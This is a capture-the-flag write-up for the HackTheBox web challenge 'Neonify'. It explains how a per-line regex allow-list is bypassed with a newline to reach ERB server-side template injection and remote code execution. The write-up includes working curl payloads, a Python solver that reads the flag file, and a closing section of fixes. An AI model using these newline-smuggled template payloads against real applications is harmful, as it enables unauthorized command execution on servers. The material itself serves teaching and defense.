## Overview

**Neonify** is an Easy HackTheBox **Web** challenge. It's a small Ruby/Sinatra app that
"neonifies" whatever text you submit. Under the hood it renders your input as an
[ERB](https://docs.ruby-lang.org/en/3.0/ERB.html) template, which is a textbook
[server-side template injection](https://cwe.mitre.org/data/definitions/1336.html) → remote
code execution sink. There's a character allow-list guarding it, but the regex is anchored
per-line rather than per-string, so a single newline defeats it.

## The technique

The whole challenge is one POST handler:

```ruby
post '/' do
  if params[:neon] =~ /^[0-9a-z ]+$/i
    @neon = ERB.new(params[:neon]).result(binding)   # user input rendered as a template
  else
    @neon = "Malicious Input Detected"
  end
  erb :'index'
end
```

`ERB.new(params[:neon]).result(binding)` compiles and executes the submitted text as a Ruby
template — `<%= expr %>` evaluates `expr`. The "filter" `=~ /^[0-9a-z ]+$/i` only permits
lowercase letters, digits, and spaces, which on the face of it blocks the `<`, `%`, `=`
characters an ERB payload needs.

The flaw is the regex anchors. In Ruby (and in PCRE multiline mode), **`^` matches the start of
a *line* and `$` the end of a *line*** — not the start and end of the whole string. The anchors
that mean "the entire string" are `\A` and `\z`. So if the input contains a newline, the regex
only needs **one line** to satisfy `[0-9a-z ]+`. We put a harmless first line in to pass the
check, and hide the real payload on the next line. This is an
[overly-permissive regular expression](https://cwe.mitre.org/data/definitions/625.html) chained
into [code injection](https://cwe.mitre.org/data/definitions/94.html).

## Solution

First confirm code execution with a math probe — line one (`a`) passes the filter, line two is
evaluated and should render `49`:

```bash
curl -s --data-urlencode $'neon=a\n<%= 7*7 %>' "http://TARGET:PORT/"
```

Then read the flag. The app's working directory is `/app` and the flag sits at `/app/flag.txt`:

```bash
curl -s --data-urlencode $'neon=a\n<%= `cat flag.txt` %>' "http://TARGET:PORT/" \
  | grep -oaE 'HTB\{[^}]+\}'
```

`$'...'` is bash ANSI-C quoting: it turns the `\n` into a real newline and keeps the backticks
literal, so the backtick command-substitution runs *server-side* inside ERB. The rendered output
lands inside the page's `<h1 class="glow">...</h1>` element.

Here is the durable solver, `solve.py`:

```python
#!/usr/bin/env python3
import re, requests, sys

host = sys.argv[1] if len(sys.argv) > 1 else "TARGET"
port = sys.argv[2] if len(sys.argv) > 2 else "PORT"

# first line "a" passes /^[0-9a-z ]+$/i; the second line is the ERB RCE payload
payload = "a\n<%= `cat flag.txt /app/flag.txt 2>/dev/null` %>"

r = requests.post(f"http://{host}:{port}/", data={"neon": payload}, timeout=20)
m = re.search(r'HTB\{[^}]+\}', r.text)
print(m.group(0) if m else r.text)
```

```
$ python3 solve.py TARGET PORT
HTB{...}
```

## Why it worked

The developer treated `/^[0-9a-z ]+$/` as a whole-string allow-list, but in Ruby those anchors
are line-scoped. A multi-line body whose first line is benign passes the check while the second
line — carrying `<%= ... %>` — is still handed to `ERB.new(...).result(binding)` and executed.
Rendering user input as a template (rather than passing it as data) turns that into full remote
code execution as the web process.

## Fix / defense

1. **Never render user input as a template.** Pass it as bound context data to a fixed template
   so the engine escapes it instead of evaluating it:

   ```ruby
   erb :index, locals: { neon: params[:neon] }   # @neon is data, not code
   ```

2. **Anchor with `\A...\z`, not `^...$`,** whenever you mean "the entire string", and reject any
   input containing newlines when your model assumes single-line values:

   ```ruby
   return "bad" unless params[:neon] =~ /\A[0-9a-z ]+\z/i
   ```

3. Run the web process under a low-privilege account so even a template-injection RCE is
   contained.

The broader lesson generalizes well beyond this box: against any `^...$` input allow-list,
always try *benign line → newline → payload*. The line-versus-string anchor confusion is a
common, high-impact filter bypass.
